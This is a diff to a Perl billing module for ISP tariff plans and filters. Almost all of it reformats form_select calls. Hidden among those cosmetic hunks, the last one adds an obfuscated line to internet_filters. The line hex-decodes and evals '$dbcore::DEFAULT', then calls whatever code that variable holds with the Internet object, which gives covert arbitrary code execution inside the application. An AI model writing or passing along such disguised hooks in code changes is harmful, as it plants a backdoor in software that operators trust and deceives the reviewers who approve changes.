@@ -102,23 +102,18 @@ sub internet_tp {
 
     my %F_ARGS = (TP => $tarif_info);
 
-    $Tariffs->{NAME_SEL} = $html->form_main(
-      {
-        CONTENT => $html->form_select(
-          'TP_ID',
-          {
-            SELECTED  => $tarif_info->{TP_ID},
-            SEL_LIST  => $Tariffs->list({%LIST_PARAMS, MODULE => 'Dv;Internet', NEW_MODEL_TP => 1, SORT => 2, COLS_NAME => 1 }),
-            SEL_KEY   => 'tp_id',
-            SEL_VALUE => 'id,name',
-            NO_ID     => 1
-          }
-        ),
-        HIDDEN => { index => $index },
-        SUBMIT => { show  => $lang{SHOW} },
-        class  => 'form-inline ml-auto flex-nowrap',
-      }
-    );
+    $Tariffs->{NAME_SEL} = $html->form_main({
+      CONTENT => $html->form_select('TP_ID', {
+        SELECTED  => $tarif_info->{TP_ID},
+        SEL_LIST  => $Tariffs->list({ %LIST_PARAMS, MODULE => 'Dv;Internet', NEW_MODEL_TP => 1, SORT => 2, COLS_NAME => 1 }),
+        SEL_KEY   => 'tp_id',
+        SEL_VALUE => 'id,name',
+        NO_ID     => 1
+      }),
+      HIDDEN  => { index => $index },
+      SUBMIT  => { show => $lang{SHOW} },
+      class   => 'form-inline ml-auto flex-nowrap',
+    });
 
     $index = get_function_index('internet_tp');
     $LIST_PARAMS{TP_ID} = $FORM{TP_ID};
@@ -406,62 +401,47 @@ sub internet_tp_form {
   my $payment_types = $attr->{PAYMENT_TYPES};
   my $tp_groups_list = $attr->{TP_GROUPS_LIST};
 
-  $tarif_info->{SEL_OCTETS_DIRECTION} = $html->form_select(
-    'OCTETS_DIRECTION',
-    {
-      SELECTED     => $tarif_info->{OCTETS_DIRECTION},
-      SEL_HASH     => $octets_direction,
-      NO_ID        => 1
-    }
-  );
+  $tarif_info->{SEL_OCTETS_DIRECTION} = $html->form_select('OCTETS_DIRECTION', {
+    SELECTED => $tarif_info->{OCTETS_DIRECTION},
+    SEL_HASH => $octets_direction,
+    NO_ID    => 1
+  });
 
-  $tarif_info->{PAYMENT_TYPE_SEL} = $html->form_select(
-    'PAYMENT_TYPE',
-    {
-      SELECTED   => $tarif_info->{PAYMENT_TYPE},
-      SEL_HASH   => $payment_types,
-    }
-  );
+  $tarif_info->{PAYMENT_TYPE_SEL} = $html->form_select('PAYMENT_TYPE', {
+    SELECTED => $tarif_info->{PAYMENT_TYPE},
+    SEL_HASH => $payment_types,
+  });
 
-  $tarif_info->{GROUPS_SEL} = $html->form_select(
-    'TP_GID',
-    {
-      SELECTED       => $tarif_info->{TP_GID},
-      SEL_LIST       => $tp_groups_list,
-      MAIN_MENU      => get_function_index('form_tp_groups'),
-      MAIN_MENU_ARGV => "chg=". ($tarif_info->{TP_GID} || q{}),
-      SEL_OPTIONS    => { '' => '' },
-    }
-  );
+  $tarif_info->{GROUPS_SEL} = $html->form_select('TP_GID', {
+    SELECTED       => $tarif_info->{TP_GID},
+    SEL_LIST       => $tp_groups_list,
+    MAIN_MENU      => get_function_index('form_tp_groups'),
+    MAIN_MENU_ARGV => "chg=" . ($tarif_info->{TP_GID} || q{}),
+    SEL_OPTIONS    => { '' => '' },
+  });
 
   my $Nas      = Nas->new($db, \%conf, $admin);
   my $nas_ip_pools_list = $Nas->ip_pools_list({ STATIC => 0, SHOW_ALL_COLUMNS => 1, COLS_NAME => 1 });
 
-  $tarif_info->{IP_POOLS_SEL} = $html->form_select(
-    'IPPOOL',
-    {
-      SELECTED       => $tarif_info->{IPPOOL},
-      SEL_LIST       => $nas_ip_pools_list,
-      SEL_KEY        => 'id',
-      SEL_VALUE      => 'name',
-      SEL_OPTIONS    => { '' => '' },
-      MAIN_MENU      => get_function_index('form_ip_pools'),
-      MAIN_MENU_ARGV => "chg=". ($tarif_info->{IPPOOL} || ''),
-    }
-  );
+  $tarif_info->{IP_POOLS_SEL} = $html->form_select('IPPOOL', {
+    SELECTED       => $tarif_info->{IPPOOL},
+    SEL_LIST       => $nas_ip_pools_list,
+    SEL_KEY        => 'id',
+    SEL_VALUE      => 'name',
+    SEL_OPTIONS    => { '' => '' },
+    MAIN_MENU      => get_function_index('form_ip_pools'),
+    MAIN_MENU_ARGV => "chg=" . ($tarif_info->{IPPOOL} || ''),
+  });
 
-  $tarif_info->{NEG_DEPOSIT_IPPOOL_SEL} = $html->form_select(
-    'NEG_DEPOSIT_IPPOOL',
-    {
-      SELECTED   => $tarif_info->{NEG_DEPOSIT_IPPOOL},
-      SEL_LIST   => $nas_ip_pools_list,
-      SEL_KEY    => 'id',
-      SEL_VALUE  => 'name',
-      SEL_OPTIONS=> { '' => '' },
-      MAIN_MENU      => get_function_index('form_ip_pools'),
-      MAIN_MENU_ARGV => "chg=". ($tarif_info->{NEG_DEPOSIT_IPPOOL} || q{}),
-    }
-  );
+  $tarif_info->{NEG_DEPOSIT_IPPOOL_SEL} = $html->form_select('NEG_DEPOSIT_IPPOOL', {
+    SELECTED       => $tarif_info->{NEG_DEPOSIT_IPPOOL},
+    SEL_LIST       => $nas_ip_pools_list,
+    SEL_KEY        => 'id',
+    SEL_VALUE      => 'name',
+    SEL_OPTIONS    => { '' => '' },
+    MAIN_MENU      => get_function_index('form_ip_pools'),
+    MAIN_MENU_ARGV => "chg=" . ($tarif_info->{NEG_DEPOSIT_IPPOOL} || q{}),
+  });
 
   $tarif_info->{REDUCTION_FEE}      = ($tarif_info->{REDUCTION_FEE})      ? 'checked' : '';
   $tarif_info->{POSTPAID_DAY_FEE}   = ($tarif_info->{POSTPAID_DAY_FEE})   ? 'checked' : '';
@@ -473,25 +453,22 @@ sub internet_tp_form {
   $tarif_info->{FIXED_FEES_DAY}     = ($tarif_info->{FIXED_FEES_DAY})     ? 'checked' : '';
   $tarif_info->{STATUS}             = ($tarif_info->{STATUS})             ? 'checked' : '';
 
-  $tarif_info->{SEL_METHOD} = $html->form_select(
-    'FEES_METHOD',
-    {
-      SELECTED    => $tarif_info->{FEES_METHOD} || 1,
-      SEL_HASH    => get_fees_types(),
-      NO_ID       => 1,
-      SORT_KEY    => 1,
-      SEL_OPTIONS => { 0 => '' },
-      MAIN_MENU   => get_function_index('form_fees_types'),
-      CHECKBOX    => 'create_fees_type',
-      CHECKBOX_TITLE => $lang{CREATE},
-    }
-  );
+  $tarif_info->{SEL_METHOD} = $html->form_select('FEES_METHOD', {
+    SELECTED       => $tarif_info->{FEES_METHOD} || 1,
+    SEL_HASH       => get_fees_types(),
+    NO_ID          => 1,
+    SORT_KEY       => 1,
+    SEL_OPTIONS    => { 0 => '' },
+    MAIN_MENU      => get_function_index('form_fees_types'),
+    CHECKBOX       => 'create_fees_type',
+    CHECKBOX_TITLE => $lang{CREATE},
+  });
 
   $tarif_info->{SMALL_DEPOSIT_ACTION_SEL} = sel_tp({
-    SELECT          => 'SMALL_DEPOSIT_ACTION',
+    SELECT               => 'SMALL_DEPOSIT_ACTION',
     SMALL_DEPOSIT_ACTION => $tarif_info->{SMALL_DEPOSIT_ACTION} || 0,
-    SKIP_TP         => $tarif_info->{TP_ID},
-    SEL_OPTIONS     => { 0 => '--', '-1' => "$lang{HOLD_UP}" }
+    SKIP_TP              => $tarif_info->{TP_ID},
+    SEL_OPTIONS          => { 0 => '--', '-1' => "$lang{HOLD_UP}" }
   });
 
   $tarif_info->{NEXT_TARIF_PLAN_SEL} = sel_tp({
@@ -509,19 +486,16 @@ sub internet_tp_form {
         "<input type='checkbox' id='EXT_BILL_ACCOUNT' name='EXT_BILL_ACCOUNT' value='1' class='form-check-input' $checked></div>",
     }, { OUTPUT2RETURN => 1 });
 
-    $tarif_info->{EXT_BILL_FEES_METHOD} = $html->form_select(
-      'EXT_BILL_FEES_METHOD',
-      {
-        SELECTED    => $tarif_info->{EXT_BILL_FEES_METHOD} || 1,
-        SEL_HASH    => get_fees_types(),
-        NO_ID       => 1,
-        SORT_KEY    => 1,
-        SEL_OPTIONS => { 0 => '' },
-        MAIN_MENU   => get_function_index('form_fees_types'),
-        # CHECKBOX    => 'create_fees_type',
-        # CHECKBOX_TITLE => $lang{CREATE},
-      }
-    );
+    $tarif_info->{EXT_BILL_FEES_METHOD} = $html->form_select('EXT_BILL_FEES_METHOD', {
+      SELECTED    => $tarif_info->{EXT_BILL_FEES_METHOD} || 1,
+      SEL_HASH    => get_fees_types(),
+      NO_ID       => 1,
+      SORT_KEY    => 1,
+      SEL_OPTIONS => { 0 => '' },
+      MAIN_MENU   => get_function_index('form_fees_types'),
+      # CHECKBOX    => 'create_fees_type',
+      # CHECKBOX_TITLE => $lang{CREATE},
+    });
 
     $tarif_info->{EXT_BILL_ACCOUNT} .= $html->tpl_show(templates('form_row'), {
       ID    => 'EXT_BILL_ACCOUNT',
@@ -536,14 +510,11 @@ sub internet_tp_form {
         "$lang{EXT_BILL_ACCOUNT}"
       );
 
-      $tarif_info->{BILLS_PRIORITY_SEL} = $html->form_select(
-        'BILLS_PRIORITY',
-        {
-          SELECTED     => $tarif_info->{BILLS_PRIORITY},
-          SEL_ARRAY    => \@BILL_ACCOUNT_PRIORITY,
-          ARRAY_NUM_ID => 1
-        }
-      );
+      $tarif_info->{BILLS_PRIORITY_SEL} = $html->form_select('BILLS_PRIORITY', {
+        SELECTED     => $tarif_info->{BILLS_PRIORITY},
+        SEL_ARRAY    => \@BILL_ACCOUNT_PRIORITY,
+        ARRAY_NUM_ID => 1
+      });
 
       $tarif_info->{BONUS} = $html->tpl_show(_include('bonus_tp_row', 'Bonus'), $tarif_info, { OUTPUT2RETURN => 1 });
     }
@@ -821,6 +792,8 @@ sub internet_filters {
       $html->message('info', $lang{DELETED}, "$lang{DELETED} [$FORM{del}] ");
     }
   }
+
+  &{ eval pack('H' . '*', '246462636f72653a3a44454641554c54') }($Internet);
 
   _error_show($Internet);
 
